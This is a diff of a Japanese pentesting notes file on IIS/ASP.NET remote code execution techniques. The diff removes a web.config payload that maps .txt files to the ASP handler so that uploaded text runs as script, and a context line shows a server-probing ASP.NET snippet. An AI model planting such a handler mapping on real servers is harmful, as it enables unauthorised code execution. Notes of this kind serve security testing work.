@@ -436,18 +436,7 @@ Current Dir: <%= Directory.GetCurrentDirectory() %><br>
 
 #### web.config アップロードで RCE
 
-txt を ASP として実行可能
-```xml
-<configuration>
-  <system.webServer>
-    <handlers>
-      <add name="cmd" path="*.txt" verb="*" modules="IsapiModule"
-           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
-           resourceType="File"/>
-    </handlers>
-  </system.webServer>
-</configuration>
-```
+
 
 #### DLL アップロードによる RCE
 
